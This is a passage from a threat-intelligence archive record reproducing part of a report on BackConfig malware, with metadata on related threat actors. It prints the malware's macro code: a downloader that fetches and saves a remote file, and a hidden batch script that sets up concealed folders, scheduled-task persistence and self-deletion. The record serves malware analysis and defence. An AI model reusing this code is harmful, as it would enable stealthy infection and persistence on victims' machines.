Resume Next\nSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\nobjXMLHTTP.open \"GET\", strFileURL, false\nobjXMLHTTP.send()\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject(\"ADODB.Stream\")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\nIf objFSO.Fileexists(strPath) Then WScript.Quit()\nSet objFSO = Nothing\nobjADOStream.SaveToFile strPath\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\n\n“Setup” BAT component\n\n\n\n[Audio.txt -> Audio.bat CODE]\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nSet oFile = fso.CreateTextFile(\"c:\\Drivers\\Audio.txt\")\noFile.WriteLine (\"echo off\")\noFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\pdf\")\noFile.WriteLine (\"md %USERPROFILE%\\Adobe\\Driver\\dwg\")\noFile.WriteLine (\"md %USERPROFILE%\\Daily\\Backup\\Files\")\noFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Adobe\")\noFile.WriteLine (\"attrib +a +h +s %USERPROFILE%\\Daily\")\noFile.WriteLine (\"attrib +a +h +s C:\\Drivers\")\noFile.WriteLine (\"del /f\n%USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\noFile.WriteLine (\"del /f\n%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\"\n\noFile.WriteLine (\"SET /A %COMPUTERNAME%\")\noFile.WriteLine (\"SET /A RAND=%RANDOM% 10000 + 1\")\noFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% >>\n%USERPROFILE%\\Adobe\\Driver\\pdf\\pid.txt\")\noFile.WriteLine (\"echo %COMPUTERNAME%-%RAND% >>\n<strong>%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\")</strong>\noFile.WriteLine (\"schtasks /delete /tn Winmgt_log /f\")\noFile.WriteLine (\"schtasks /delete /tn Yahoo_Drive /f\")\noFile.WriteLine (\"schtasks /create /sc minute /mo 10 /f /tn\nWinmgt_log /tr C:\\Drivers\\dphc.exe\")\noFile.WriteLine (\"schtasks /create /sc minute /mo 20 /f /tn\nYahoo_Drive /tr C:\\Drivers\\Drive.vbs\")\noFile.WriteLine (\"ren C:\\Drivers\\Drive.txt Drive.vbs \")\noFile.WriteLine (\"del %0\")\noFile.Close\nSet fso = Nothing\nSet oFile = Nothing\n\nDim OldName, NewName\nGivenLocation = \"C:\\Drivers\\\"\nOldName = \"Audio.txt\"\n<strong>NewName = \"Audio.bat\"</strong>\nOn Error Resume Next\nName GivenLocation & OldName As GivenLocation & NewName\nDim RetVal\nRetVal = Shell(\"C:\\Drivers\\Audio.bat\", vbHide)\n\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-11 - Updated BackConfig Malware Targeting Government and Military Organizations in South Asia.pdf"
    ],
    "report_names": [
        "2020-05-11 - Updated BackConfig Malware Targeting Government and Military Organizations in South Asia.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ac63ef4-a7b8-4a30-96ad-b30ccb2073fc",
            "created_at": "2022-10-25T16:07:23.546262Z",
            "updated_at": "2025-03-27T02:02:09.856624Z",
            "deleted_at": null,
            "main_name": "Donot Team",
            "aliases": [
                "APT-C-35",
                "SectorE02"
            ],
            "source_name": "ETDA:Donot Team",
            "tools": [
                "BackConfig",
                "EHDevel",
                "Jaca",
                "yty"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ca292585-950c-400f-b632-c19fa3491fe1",
            "created_at": "2022-10-25T15:50:23.599765Z",
            "updated_at": "2025-03-27T02:00:55.504509Z",
            "deleted_at": null,
            "main_name": "MONSOON",
            "aliases": null,
            "source_name": "MITRE:MONSOON",
            "tools": [
                "TINYTYPHON",
                "BADNEWS",
                "Unknown Logger",
                "AutoIt backdoor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88854a9f-641a-4412-89db-449b4d5cbc51",
            "created_at": "2022-10-25T16:07:23.963599Z",
            "updated_at": "2025-03-27T02:02:10.051548Z",
            "deleted_at": null,
            "main_name": "Operation HangOver",
            "aliases": [
                "Monsoon",
                "Operation HangOver",
                "Viceroy Tiger"
            ],
            "source_name": "ETDA:Operation HangOver",
            "tools": [
                "AutoIt backdoor",
                "BADNEWS",
                "BackConfig",
                "JakyllHyde",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
            "created_at": "2023-01-06T13:46:38.433736Z",
            "updated_at": "2025-03-27T02:00:02.832565Z",
            "deleted_at": null,
            "main_name": "VICEROY TIGER",
            "aliases": [
                "OPERATION HANGOVER",
                "Donot Team",
                "APT-C-35",
                "SectorE02",
                "Orange Kala"
            ],
            "source_name": "MISPGALAXY:VICEROY TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535937,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1653705520,
    "ts_modification_date": 1653705520,
    "files": {
        "pdf": "https://archive.orkl.eu/45c9537e0d6a34361357f3fef44a12a0f726c772.pdf",
        "text": "https://archive.orkl.eu/45c9537e0d6a34361357f3fef44a12a0f726c772.txt",
        "img": "https://archive.orkl.eu/45c9537e0d6a34361357f3fef44a12a0f726c772.jpg"
    }
}